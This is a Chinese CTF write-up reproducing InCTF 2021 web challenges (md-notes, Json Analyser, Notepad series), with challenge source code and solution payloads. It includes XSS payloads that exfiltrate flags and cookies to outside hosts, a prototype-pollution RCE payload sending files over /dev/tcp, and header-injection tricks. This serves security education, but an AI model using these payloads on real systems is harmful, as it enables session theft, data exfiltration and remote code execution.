# InCTF 复现

阅读量 **173626**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-02 10:00:01

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

作者:DR[@03](https://github.com/03 "@03")@星盟

## md-notes

###  环境搭建

####  docker遇到报错1

Sending build context to Docker daemon 32.26kB  
Step 1/16 : FROM golang:alpine  
—-> cfae2977b751  
Step 2/16 : RUN apk —no-cache add build-base  
—-> Running in edbf89a8989c  
fetch <https://dl-cdn.alpinelinux.org/alpine/v3.14/main/x86_64/APKINDEX.tar.gz>  
WARNING: Ignoring <https://dl-cdn.alpinelinux.org/alpine/v3.14/main>:
temporary error (try again later)  
fetch <https://dl-cdn.alpinelinux.org/alpine/v3.14/community/x86_64/APKINDEX.tar.gz>  
WARNING: Ignoring <https://dl-cdn.alpinelinux.org/alpine/v3.14/community>:
temporary error (try again later)  
ERROR: unable to select packages:  
build-base (no such package):  
required by: world[build-base]  
The command ‘/bin/sh -c apk —no-cache add build-base’ returned a non-zero
code: 1

####  解决方法1

换源

在第二句上面增加一句RUN sed -i ‘s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g’
/etc/apk/repositories

####  docker遇到报错2

然后问题是go:
github.com/gomarkdown/[markdown@v0.0.0](mailto:markdown@v0.0.0)-20210514010506-3b9f47219fe7:
Get “<a
href=”https://proxy.golang.org/github.com/gomarkdown/markdown/[@v](https://github.com/v
"@v")/v0.0.0-20210514010506-3b9f47219fe7.mod””>https://proxy.golang.org/github.com/gomarkdown/markdown/@v/v0.0.0-20210514010506-3b9f47219fe7.mod“:
dial tcp 142.251.43.17:443: connect: connection refused

####  解决方法2

如链接所做

[[go学习]解决golang.org无法访问的问题_zhagzheguo的博客-CSDN博客_golang.org](https://blog.csdn.net/zhagzheguo/article/details/102570450)

###  做题

####  信息搜集

这是一个markdown界面，一般考点在于xss和csrf。

由于是ctf题目，所以不进行端口和whois等信息搜集。

可以尝试路径爆破。

比赛时，我没有尝试过，现在复现时，发现存在很多可知路径，可能是环境搭建的原因，故不深究。部分回显如下

![](https://p5.ssl.qhimg.com/t014ee41a570cabd78f.png)

当然，还可以看看有没有源码泄露，备份文件泄露等内容。这里不做尝试，但是这些步骤确实在比赛中应该存在。

#####  app.js

这道题得到的信息来源在于源码，存在app.js

![](https://p4.ssl.qhimg.com/t0123bbc5f9f95a4035.png)

app.js存在网站运行逻辑

    
    
    let preview = document.getElementById("preview"),
        save = document.getElementById("save"),
        textarea = document.getElementById("input-area"),
        frame = document.getElementById("frame-area"),
        status = document.getElementById("status"), 
        token = undefined; 
    
    alert = function(msg) {
        status.innerText = "Info: " + msg; 
    }
    
    preview.onclick = function() {
        console.log("Sending Preview..")
        frame.contentWindow.postMessage(textarea.value, `http://${document.location.host}/`); 
        return false;
    }
    
    save.onclick = function() {
        if (token == undefined)
        {
            alert("Preview before saving!")
        } else {
            fetch("/api/create", {
                method: "POST",
                credentials: "include",
                body: JSON.stringify({
                    Hash: token,
                    Raw: textarea.value
                })
            }).then(resp => resp.json())
            .then(response => {
                if (response["Status"] != "success") {
                    alert("Could not save markdown.")
                } else {
                    alert("Saved post to : " + response["Bucket"] + "/" + response["PostId"])
                    frame.src = `http://${document.location.host}/${response['Bucket']}/${response["PostId"]}`
                }
                console.log(response)
                token = undefined
            }); 
        }
        return false; 
    }
    
    window.addEventListener("message", (event) => {
        if (event.origin != window.origin)
        {
            console.log("Error");
            return false;
        }
        data = event.data
        textarea.value = data["Raw"]
        token = data["Hash"]
    });
    

preview就是将框内内容传到特定网址，且我们不能改变。

save就是向create POST传参接收bucket和postid作为路径

#####  preview.js

除此之外，在页面源代码中还有一个路径/demo

访问后得到preview.js

    
    
    let area = document.getElementById("safe")
    
    window.addEventListener("message", (event) => {
        console.log("Previewing..")
        let raw = event.data
    
        fetch("/api/filter", {
            method: "POST",
            credentials: "include",
            body: JSON.stringify({
                raw: raw
            })
        })
        .then(resp => resp.json())
        .then(response => {
            console.log("Filtered")
            document.body.innerHTML = response.Sanitized
            window.parent.postMessage(response, "*"); 
        }); 
    }, false);
    

向filter POST传参

经过过滤的内容，作为html插入网站

还有window.parent.postMessage

这就是一个漏洞点

在[window.postMessage – Web API 接口参考 | MDN
(mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage)中提到

**当您使用postMessage将数据发送到其他窗口时，始终指定精确的目标origin，而不是*。**

而这道题恰恰使用了*，所以我们可以接收到postmessage的内容。

那么postmessage存在哪些内容呢

我们可以抓包看看

![](https://p0.ssl.qhimg.com/t01a4240728e225b3ba.png)

有hash值，sanitizedhtml语句和语句raw。

我们要想访问flag，就需要获取admin的token。

#####  server.go

    
    
    package main
    
    import (
        "os"
        "fmt"
        "log"
        "html"
        "time"
        "strconv"
        "net/http"
        "io/ioutil"
        "math/rand"
        "encoding/hex"
        "database/sql"
        "encoding/json"
        "html/template"
        "crypto/sha256"
    
        "github.com/gorilla/mux"
        "github.com/nu7hatch/gouuid"
        "github.com/gorilla/handlers"
        _ "github.com/mattn/go-sqlite3"
        "github.com/gomarkdown/markdown"
    
    )
    
    var indexTmpl = template.Must(template.ParseFiles("./templates/index.html"))
    var previewTmpl = template.Must(template.ParseFiles("./templates/preview.html"))
    
    type Unsanitized struct {
        Raw string `json:"raw"`
    }
    
    type Sanitized struct {
        Sanitized string `json:Sanitized`
        Raw string `json:Raw`
        Hash string `json:Hash`
    }
    
    type Preview struct {
        Error string
        Data template.HTML
    }
    
    type CreatePost struct {
        Raw string 
        Hash string
    }
    
    type Config struct {
        admin_bucket string
        admin_token string
        admin_hash string
        secret string
        modulus int
        seed int
        a int
        c int
    }
    
    var CONFIG Config
    var db *sql.DB
    
    func createToken() (string, string) {
        token, _ := uuid.NewV4()
        h := sha256.New()
        h.Write([]byte(token.String() + CONFIG.secret))
        sha256_hash := hex.EncodeToString(h.Sum(nil))
        return string(sha256_hash), token.String()
    }
    
    func verifyToken(token, input string) bool {
        h := sha256.New()
        h.Write([]byte(token  + CONFIG.secret))
        sha256_hash := hex.EncodeToString(h.Sum(nil))
    
        if string(sha256_hash) == input {
            return true
        } 
        return false
    }
    
    func getadminhash() string {
        token := CONFIG.admin_token
        h := sha256.New()
        h.Write([]byte(token + CONFIG.secret))
        sha256_hash := hex.EncodeToString(h.Sum(nil))
        log.Println("Generated admin's hash ", sha256_hash)
        return string(sha256_hash)
    }
    
    func save_post(bucket, data string) int {
        postid := ((CONFIG.seed * CONFIG.a) + CONFIG.c) % CONFIG.modulus
        CONFIG.seed = postid
        stmt, _ := db.Prepare("INSERT INTO posts(postid, bucket, note) VALUES (?, ?, ?)")
        stmt.Exec(postid, bucket, data)
        return postid
    }
    
    func sanitize(raw string) string {
        return html.EscapeString(raw)
    }
    
    func indexHandler(w http.ResponseWriter, r *http.Request) {
        indexTmpl.Execute(w, nil)
    }
    
    func previewHandler(w http.ResponseWriter, r *http.Request) {
        vars := mux.Vars(r)
        res := Preview{Error: "", Data: ""}
    
        postid, found := mux.Vars(r)["postid"]
        if found {
            bucketid := vars["bucketid"]
            fmt.Println("Requested for", bucketid, postid)
            id, _ := strconv.ParseInt(postid, 10, 64)
            rows, err := db.Query("SELECT note FROM posts WHERE bucket = ? AND postid = ?", bucketid, id)
            checkErr(err)
    
            counter := 0
            var note string
    
            for rows.Next(){
                if err := rows.Scan(&note); err != nil {
                    log.Fatal("Unable to scan results:", err)
                }
                counter++
            }
    
            if counter == 0 {
                res = Preview{Error: "Note not found.", Data: ""}
            } else if counter != 1 {
                res = Preview{Error: "Could not find notes.", Data: ""}
            } else {
                res = Preview{Error: "", Data: template.HTML(note)}
            }
        } 
        previewTmpl.Execute(w, res)
    }
    
    func filterHandler(w http.ResponseWriter, r *http.Request) {
        reqBody, _ := ioutil.ReadAll(r.Body)
        w.Header().Set("Content-Type", "application/json")
        var unsanitized Unsanitized
    
        err := json.Unmarshal(reqBody, &unsanitized)
    
        if err != nil {
    
            log.Println("Error decoding JSON. err = %s", err)
            fmt.Fprintf(w, "Error decoding JSON.")
    
        } else {
            var cookie, isset = r.Cookie("Token") 
    
            hash, token := createToken()
    
            sanitized_data := markdown.ToHTML([]byte(sanitize(unsanitized.Raw)), nil, nil)
    
            if isset == nil {
                if cookie.Value == CONFIG.admin_token {
                    hash = CONFIG.admin_hash
                    token = CONFIG.admin_token
                }
            } 
    
            cookie = &http.Cookie{Name: "Token", Value: token, HttpOnly: true, Path: "/api"}
            result := Sanitized{Sanitized: string(sanitized_data), Raw: unsanitized.Raw, Hash: hash}
            http.SetCookie(w, cookie)
            json.NewEncoder(w).Encode(result)
        }
    }
    
    func createHandler(w http.ResponseWriter, r *http.Request) {
        reqBody, _ := ioutil.ReadAll(r.Body)
        w.Header().Set("Content-Type", "application/json")
    
        type Response struct {
            Status string
            PostId int
            Bucket string
        }
        var createpost CreatePost
    
        if json.Unmarshal(reqBody, &createpost) != nil {
            log.Println("There was an error decoding json. \n")
            json.NewEncoder(w).Encode(Response{Status: "Save Error"})
        } else {
            var cookie, err = r.Cookie("Token")
    
            if err == nil {
                var token = cookie.Value
                if verifyToken(token, createpost.Hash) || (createpost.Hash == CONFIG.admin_hash){
                    bucket := CONFIG.admin_bucket
                    data := createpost.Raw
    
                    if createpost.Hash != CONFIG.admin_hash {
                        id , _ := uuid.NewV4()
                        bucket = id.String()
                        data = string(markdown.ToHTML([]byte(sanitize(data)), nil, nil))
                    } else {
                        data = string(markdown.ToHTML([]byte(data), nil, nil))
                    }
    
                    postid := save_post(bucket, data)
                    log.Println("Saved post to", postid)
                    json.NewEncoder(w).Encode(Response{Status: "success", Bucket: bucket, PostId: postid})
                } else {
                    log.Println("Verification failed for ", createpost.Hash, token)
                    json.NewEncoder(w).Encode(Response{Status: "Token not verified"})
                }
            } else {
                json.NewEncoder(w).Encode(Response{Status: "Invalid body."})
            }
        }
    }
    
    func flag(w http.ResponseWriter, r *http.Request) {
        var cookie, err = r.Cookie("Token")
        res := Preview{Error: "", Data: "'"}
        if err == nil {
            if cookie.Value == CONFIG.admin_token {
                res.Data = template.HTML(CONFIG.admin_token)
            } else {
                res.Data = template.HTML("You are not admin.")
            }
        }
        previewTmpl.Execute(w, res)    
    }
    
    func debug(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "application/json")
            type Response struct {
                Admin_bucket string
                VAL_A int
                VAL_B int
            }
        json.NewEncoder(w).Encode(Response{Admin_bucket: CONFIG.admin_bucket, VAL_A: CONFIG.a, VAL_B: CONFIG.c})
    }
    
    func clear_database() {
        for range time.Tick(time.Second * 1 * 60 * 30) {
            stmt, _ := db.Prepare("DELETE FROM posts")
            stmt.Exec()
            log.Println("Cleared database.")
        }
    }
    
    func handleRequests() {
        route := mux.NewRouter().StrictSlash(true)
        go clear_database()
    
        fs := http.FileServer(http.Dir("./static/"))
        route.PathPrefix("/static/").Handler(http.StripPrefix("/static/", fs))
        route.HandleFunc("/", indexHandler)
        route.HandleFunc("/demo",  previewHandler).Methods("GET")
        route.HandleFunc("/api/flag", flag).Methods("GET")
        route.HandleFunc("/api/filter", filterHandler).Methods("POST")
        route.HandleFunc("/api/create", createHandler).Methods("POST")
        route.HandleFunc("/{bucketid}/{postid}", previewHandler).Methods("GET")
        route.HandleFunc("/_debug",  debug).Methods("GET")
    
        loggedRouter := handlers.LoggingHandler(os.Stdout, route)
        srv := &http.Server{
            Addr: "0.0.0.0" + os.Getenv("PORT"),
            WriteTimeout: time.Second * 15,
            ReadTimeout:  time.Second * 15,
            IdleTimeout:  time.Second * 60,
            Handler:      loggedRouter,
        }
    
        if err := srv.ListenAndServe(); err != nil {
            log.Println(err)
        }
    }
    
    func checkErr(err error) {
        if err != nil {
            panic(err)
        }
    }
    
    func main() {
        db, _ = sql.Open("sqlite3", "./database.db")
    
        stmt, _ := db.Prepare("CREATE TABLE IF NOT EXISTS posts (postid, bucket, note)")
        stmt.Exec()
    
        stmt, _ = db.Prepare("DELETE FROM posts")
        stmt.Exec()
    
        a, _ := strconv.Atoi(os.Getenv("VAL_A"))
        c, _ := strconv.Atoi(os.Getenv("VAL_B"))
    
        CONFIG = Config{
            admin_bucket: os.Getenv("ADMIN_BUCKET"),
            admin_token: os.Getenv("FLAG"),
            secret: os.Getenv("SECRET"),
            admin_hash: getadminhash(), 
            modulus: 99999999999,
            seed: rand.Intn(9e15) + 1e15, 
            a: a, 
            c: c,
        }
    
        fmt.Println("App running on http://localhost", os.Getenv("PORT"))
        handleRequests()
    }
    

####  解题思路

markdown界面可能可以构造xss，通过postmessage的漏洞我们能够获取hash值，还有一个bot界面可以访问任意网页，而我们需要的是token。所以我们构造一个存储型xss利用CSRF获取flag。

现在问题是如何生成xss

    
    
    if createpost.Hash != CONFIG.admin_hash {
    
    ​    id , _ := uuid.NewV4()
    
    ​    bucket = id.String()
    
    ​    data = string(markdown.ToHTML([]byte(sanitize(data)), nil, nil))
    
    } else {
    
    ​    data = string(markdown.ToHTML([]byte(data), nil, nil))
    
    }
    

由代码可知，当我们的hash值是admin的值时，markdown语句直接插入。

所以我们自己构造一个网页，让bot访问从而得到hash。再利用hash写入存储型xss，最后得到token获取flag

####  实践

构建页面实现小窗口访问demo

    
    
    <iframe src="http://172.17.0.3/demo:8080" id="iframe" ></iframe>
    

虽然在这里我们会接收到hash，但是并不会在前端显示，所以我们要将包中数据显示在我们可以看到的地方。将上面的代码完善

    
    
    <script>
    function exploit(){
    document.getElementById("iframe").contentWindow.postMessage("test","*")
    }
    window.addEventListener("message",(event)=>{
    var imag = new Image();
    img.src = "http://172.17.0.3/?hash="+event.data.Hash;
    },false);
    </script>
    <iframe src="http://172.17.0.3/demo:8080" id="iframe" onload="exploit()" ></iframe>
    

将接收到的hash当作参数和网址当作图片链接。我们查看图片链接就可以知道hash

然后注入xss

    
    
    <script>
        fetch(String.fromCharCode(47, 97, 112, 105, 47, 102, 108, 97, 103))   //  /api/flag
        .then(function(response) {return response.text();})
        .then(function (text) {
            var img = new Image();
            img.src = String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 48, 53, 53, 99, 52, 100, 52, 50, 49, 56, 57, 101, 46, 110, 103, 114, 111, 107, 46, 105, 111, 47, 63, 100, 97, 116, 97, 61) + encodeURIComponent(text);    /http://     /  ? text
        })
    </script>
    

最后利用CSRF获取flag

###  总结

hash通过postmessage漏洞获取，xss注入后，实现CSRF得到flag

这道题环境搭建不完全，bot没有，解题过程借鉴了[MD Notes – CTFs
(zeyu2001.com)](https://ctf.zeyu2001.com/2021/inctf-2021/md-notes)

## Json Analyser

###  环境搭建

唯一问题 npm install 不能执行

再dockerfile中增加npm config set strict-ssl false解决

###  做题

有两个js文件,但是源码并不完全

####  script.js

    
    
    $("form").on("change", ".file-upload-field", function(){ 
        $(this).parent(".file-upload-wrapper").attr("data-text",         $(this).val().replace(/.*(\/|\\)/, '') );
    });
    

####  get_role.js

    
    
    function get_roles(){
        const role=document.getElementById("role").value
        fetch('http://127.0.0.1:5555/verify_roles?role='+role).then(response=>
            response.text()
        ).then(data =>{
            document.getElementById("output").innerHTML=data;
        })
    }
    

对功能进行操作，发现上传文件需要pin，目前还是没有思路，打开waf.py查看源码

####  waf.py

    
    
    from flask import Flask, request
    from flask_cors import CORS
    import ujson
    import json
    import re
    import os
    
    os.environ['subscription_code'] = '[REDACTED]'
    app=Flask(__name__)
    cors = CORS(app)
    CORS(app)
    cors = CORS(app, resources={
        r"/verify_roles": {
           "origins": "*"
        }
    })
    
    @app.route('/verify_roles',methods=['GET','POST'])
    def verify_roles():
        no_hecking=None
        role=request.args.get('role')
        if "superuser" in role:
            role=role.replace("superuser",'')
        if " " in role:
            return "n0 H3ck1ng"
        if len(role)>30:
            return "invalid role"
        data='"name":"user","role":"{0}"'.format(role)
        no_hecking=re.search(r'"role":"(.*?)"',data).group(1)
        if(no_hecking)==None:
            return "bad data :("
        if no_hecking == "superuser":
            return "n0 H3ck1ng"
        data='{'+data+'}'
        try:
            user_data=ujson.loads(data)
        except:
            return "bad format" 
        role=user_data['role']
        user=user_data['name']
        if (user == "admin" and role == "superuser"):
            return os.getenv('subscription_code')
        else:
            return "no subscription for you"
    
    if __name__=='__main__':
        app.run(host='0.0.0.0',port=5555)
    

role=role.replace(“superuser”,’’)

替换superuser为空

if “ “ in role:  
return “n0 H3ck1ng”

不能有空格

role<30

if (user == “admin” and role == “superuser”):  
return os.getenv(‘subscription_code’)

需要user为admin role为superuser

但是data=’”name”:”user”,”role”:”{0}”‘.format(role)决定了name是user，这里需要用到ujson的重复键

####  重复键

    
    
    obj = {"test": 1, "test": 2}
    

obj[test] =2

所以，我们在 role传参时，包含user : admin 使得user为admin，同时由于替换superuser所以使用复写绕过

role=supersuperuseruser”,”user”: “admin

但是if no_hecking == “superuser”:  
return “n0 H3ck1ng”

使得尽管绕过了替换，后续的检测依旧不能成功

我们需要role!===superuser 但是 role == superuser
，这怎么实现呢，我们可以看到下面的user_data=ujson.loads(data)，ujson存在字符截断，就是U+D800-U+DFFF在ujson的解析中，不会影响值。

所以我们使用role=supersuperuseruser/ud800”,”user”:”admin

![](https://p0.ssl.qhimg.com/t01dded89abc0933448.png)

上传一个json

![](https://p5.ssl.qhimg.com/t017428df151537664e.png)

源码是app.py

    
    
    const express = require('express');
    const fileUpload = require('express-fileupload');
    const fs = require("fs");
    const sqrl = require('squirrelly');
    const app = express();
    port = 8088
    
    
    
    app.use(express.static('static'));
    app.set('view engine', 'squirrelly');
    app.set('views', __dirname + '/views')
    app.use(fileUpload());
    
    app.get('/waf', function (req, res) {
        res.sendFile(__dirname+'/static/waf.html');
    });
    
    app.get('/restart',function(req,res){
        var content='';
        content=fs.readFileSync('package.json','utf-8')
        fs.writeFileSync('package1.json', content)
    })
    
    app.get('/', function (req, res) {
        res.sendFile(__dirname+'/static/index.html');
    });
    
    app.post('/upload', function(req, res) {
        let uploadFile;
        let uploadPath;
        if(req.body.pin !== "[REDACTED]"){
            return res.send('bad pin')
        }
        if (!req.files || Object.keys(req.files).length === 0) {
          return res.status(400).send('No files were uploaded.');
        }
        uploadFile = req.files.uploadFile;
        uploadPath = __dirname + '/package.json' ;
        uploadFile.mv(uploadPath, function(err) {
            if (err)
                return res.status(500).send(err);
            try{
                var config = require('config-handler')();
            }
            catch(e){
                const src = "package1.json";
                const dest = "package.json";
                fs.copyFile(src, dest, (error) => {
                    if (error) {
                        console.error(error);
                        return;
                    }
                    console.log("Copied Successfully!");
                });
                return res.sendFile(__dirname+'/static/error.html')
            }
            var output='\n';
            if(config['name']){
                output=output+'Package name is:'+config['name']+'\n\n';
            }
            if(config['version']){
                output=output+ "version is :"+ config['version']+'\n\n'
            }
            if(config['author']){
                output=output+"Author of package:"+config['author']+'\n\n'
            }
            if(config['license']){
                var link=''
                if(config['license']==='ISC'){
                    link='https://opensource.org/licenses/ISC'+'\n\n'
                }
                if(config['license']==='MIT'){
                    link='https://www.opensource.org/licenses/mit-license.php'+'\n\n'
                }
                if(config['license']==='Apache-2.0'){
                    link='https://opensource.org/licenses/apache2.0.php'+'\n\n'
                }
                if(link==''){
                    var link='https://opensource.org/licenses/'+'\n\n'
                }
                output=output+'license :'+config['license']+'\n\n'+'find more details here :'+link;
            }
            if(config['dependencies']){
                output=output+"following dependencies are thier corresponding versions are used:" +'\n\n'+'     '+JSON.stringify(config['dependencies'])+'\n'
            }
    
            const src = "package1.json";
            const dest = "package.json";
            fs.copyFile(src, dest, (error) => {
                if (error) {
                    console.error(error);
                    return;
                }
            });
            res.render('index.squirrelly', {'output':output})
        });
    });
    
    
    
    var server= app.listen(port, () => {
        console.log(`Example app listening at http://localhost:${port}`)
    });
    server.setTimeout(10000);
    

这里推测需要原型链污染RCE

在name中添加

    
    
    {
        "__proto__":{
             "defaultFilter" : "e'));process.mainModule.require('child_process').execSync('/bin/bash -c \\'cat /* > /dev/tcp/172.17.0.2:1554/\\'')//"
          }
    }
    

###  总结

知识点在于重复键名读取最后一个，ujson解析有\ud800不可读，原型链污染反弹shell

借鉴[JsonAnalyser](https://blog.bi0s.in/2021/08/15/Web/inCTFi21-JsonAnalyser/)

## Notepad系列

###  notepad1

####  环境搭建

问题一

go: github.com/gorilla/[handlers@v1.5.1](mailto:handlers@v1.5.1): Get “<a
href=”https://proxy.golang.org/github.com/gorilla/handlers/[@v](https://github.com/v
"@v")/v1.5.1.mod””>https://proxy.golang.org/github.com/gorilla/handlers/@v/v1.5.1.mod“:
dial tcp 142.251.43.17:443: connect: connection refused

解决方法

在dockerfile中增加go env -w GOPROXY=<https://goproxy.cn>

问题二

404

解决方法

改main.go的r.host为自己环境的访问网址（感谢jiryu指点）

####  解题

#####  源码

    
    
    package main
    
    import (
        "crypto/md5"
        "encoding/hex"
        "flag"
        "fmt"
        "log"
        "math/rand"
        "net/http"
        "os"
        "regexp"
        "strings"
        "time"
    
        "github.com/gorilla/handlers"
        "github.com/gorilla/mux"
    )
    
    const adminID = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    const adminNOTE = "inctf{flag}"
    
    var Notes = make(map[string]string)
    
    // Prevent XSS on api-endpoints ¬‿¬
    var cType = map[string]string{
        "Content-Type":            "text/plain",
        "x-content-type-options":  "nosniff",
        "X-Frame-Options":         "DENY",
        "Content-Security-Policy": "default-src 'none';",
    }
    
    func cookGenerator() string {
        hash := md5.Sum([]byte(string(rand.Intn(30))))
        return hex.EncodeToString((hash)[:])
    }
    
    func headerSetter(w http.ResponseWriter, header map[string]string) {
        for k, v := range header {
            w.Header().Set(k, v)
        }
    }
    
    func getIDFromCooke(r *http.Request, w http.ResponseWriter) string {
        var cooke, err = r.Cookie("id")
        re := regexp.MustCompile("^[a-zA-Z0-9]+$")
        var cookeval string
        if err == nil && re.MatchString(cooke.Value) && len(cooke.Value) <= 35 && len(cooke.Value) >= 30 {
            cookeval = cooke.Value
        } else {
            cookeval = cookGenerator()
            c := http.Cookie{
                Name:     "id",
                Value:    cookeval,
                SameSite: 2,
                HttpOnly: true,
                Secure:   false,
            }
            http.SetCookie(w, &c)
        }
        return cookeval
    }
    
    func add(w http.ResponseWriter, r *http.Request) {
    
        id := getIDFromCooke(r, w)
        if id != adminID {
            r.ParseForm()
            noteConte := r.Form.Get("content")
            if len(noteConte) < 75 {
                Notes[id] = noteConte
            }
        }
        fmt.Fprintf(w, "OK")
    }
    
    func get(w http.ResponseWriter, r *http.Request) {
        id := getIDFromCooke(r, w)
        x := Notes[id]
        headerSetter(w, cType)
        if x == "" {
            fmt.Fprintf(w, "404 No Note Found")
        } else {
            fmt.Fprintf(w, x)
        }
    }
    
    func find(w http.ResponseWriter, r *http.Request) {
    
        id := getIDFromCooke(r, w)
    
        param := r.URL.Query()
        x := Notes[id]
    
        var which string
        str, err := param["condition"]
        if !err {
            which = "any"
        } else {
            which = str[0]
        }
    
        var start bool
        str, err = param["startsWith"]
        if !err {
            start = strings.HasPrefix(x, "snake")
        } else {
            start = strings.HasPrefix(x, str[0])
        }
        var responseee string
        var end bool
        str, err = param["endsWith"]
        if !err {
            end = strings.HasSuffix(x, "hole")
        } else {
            end = strings.HasSuffix(x, str[0])
        }
    
        if which == "starts" && start {
            responseee = x
        } else if which == "ends" && end {
            responseee = x
        } else if which == "both" && (start && end) {
            responseee = x
        } else if which == "any" && (start || end) {
            responseee = x
        } else {
            _, present := param["debug"]
            if present {
                delete(param, "debug")
                delete(param, "startsWith")
                delete(param, "endsWith")
                delete(param, "condition")
    
                for k, v := range param {
                    for _, d := range v {
    
                        if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && len(d) < 50 {
                            w.Header().Set(k, d)
                        }
                        break
                    }
                    break
                }
            }
            responseee = "404 No Note Found"
        }
        headerSetter(w, cType)
        fmt.Fprintf(w, responseee)
    }
    
    // Reset notes every 30 mins.  No Vuln in this
    func resetNotes() {
        Notes[adminID] = adminNOTE
        for range time.Tick(time.Second * 1 * 60 * 30) {
            Notes = make(map[string]string)
            Notes[adminID] = adminNOTE
        }
    }
    
    func main() {
        rand.Seed(time.Now().UnixNano())
    
        var dir string
        flag.StringVar(&dir, "dir", "./public", "the directory to serve files from. Defaults to the current dir")
        flag.Parse()
        go resetNotes()
        r := mux.NewRouter()
        s := r.Host("这里更改").Subrouter()
        s.HandleFunc("/add", add).Methods("POST")
        s.HandleFunc("/get", get).Methods("GET")
        s.HandleFunc("/find", find).Methods("GET")
        s.PathPrefix("/").Handler(http.StripPrefix("/", http.FileServer(http.Dir(dir))))
        fmt.Println("Server started at http://0.0.0.0:3000")
        loggedRouter := handlers.LoggingHandler(os.Stdout, r)
        srv := &http.Server{
            Addr: "0.0.0.0:3000",
            // Good practice to set timeouts to avoid Slowloris attacks.
            WriteTimeout: time.Second * 15,
            ReadTimeout:  time.Second * 15,
            IdleTimeout:  time.Second * 60,
            Handler:      loggedRouter, // Pass our instance of gorilla/mux in.
        }
        if err := srv.ListenAndServe(); err != nil {
            log.Println(err)
        }
    }
    

首先看看flag在哪：resetnotes中，将note[adminid] 设为flag，我们需要读取就要知道adminid，从find get
add中我们看到id从cookie中得到，所以我们要获得admin的cookie

根据提示，漏洞在api

分析add find get

add get 平平无奇，只有find比较复杂

包括了start end condition 以及debug

显然debug 是重点

将输入键值分离插入头中

而这里我们可以通过setcookie添加cookie

####  复现

首先，要想拿到flag就要用admin的id去访问get

如何获取是第一步

我们制造一个存储型xss，让bot的cookie被记录，但是由于存储有长度限制，所以以cookie作为跳板

<img/src/onerror=”eval(document.cookie.split(‘; ‘).sort().join(‘;’))”>

将\<img src=# id=xssyou style=display:none
onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxsscom.com%2F%2FZcc2gA%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>

分到下面语句中

debug=a&Set-Cookie=var A = “”;

debug=a&Set-Cookie=var B = A + “”;

………………………..

访问可得cookie

第二步设置cookie，我们使用set-cookie，利用find的debug

    
    
    debug=a&Set-Cookie=id=${cookie}%3B%20path=/get
    

然后我们访问get，发现访问时cookie添加了admin的id，flag获得

![](https://p0.ssl.qhimg.com/t01e8f611f8502f4296.png)

###  notepad15

环境搭建上同

####  解题

15和1的区别就在于不能直接上传xss，以及对传参进行了限制

    
    
    for v, d := range param {
        for _, k := range d {
    
            if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && len(d) < 5 {
                w.Header().Set(v, k)
            }
            break
        }
        break
    }
    

检测最后的值以及限制长度

所以我们要寻找新的漏洞点

[CRLF in Flask’s headers.set method in make_response · Issue #4238 ·
pallets/flask · GitHub](https://github.com/pallets/flask/issues/4238)

一个header().set()的漏洞能够填充header

利用漏洞，我们在content中增加xss的script代码

但是，我们不能使用第一题的思路先获取cookie再得到flag。

我们要直接bot访问我们的网页，利用CSRF直接获取flag返回。

我们使用window.open(“[http://IP:PORT/find?debug=a&Content-Type:text/html%0A%0A%3Chtml%3E%3Cscript%3Eeval(window.name)%3C/script%3E](http://IP:PORT/find?debug=a&Content-Type:text/html%0A%0A%3Chtml%3E%3Cscript%3Eeval\(window.name\)%3C/script%3E)“,
name=`fetch(‘/get’).then(response=>response.text()).then(data=>navigator.sendBeacon(‘接收IP’,data))`)

借鉴[Notepad Series – InCTF Internationals 2021 |
bi0s](https://blog.bi0s.in/2021/08/16/Web/notepad-inctf21/)

## raas

由于没有环境可以复现，当时我也没有看这道题，所以给个wp地址[RaaS – CTFs
(zeyu2001.com)](https://ctf.zeyu2001.com/2021/inctf-2021/raas)

简单来说就是可以根据file协议读取文件，根据dockerfile得知存在文件app.py，发现使用了redis，当GET传参，cookie存在userid且判断isadmin为yes则返回flag，然后以gopher传输redis命令

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **星盟安全团队** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254798](/post/id/254798)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)

 **+1** __0赞

 __收藏

![](https://p3.ssl.qhimg.com/t0194c173898acf47c6.png) 星盟安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

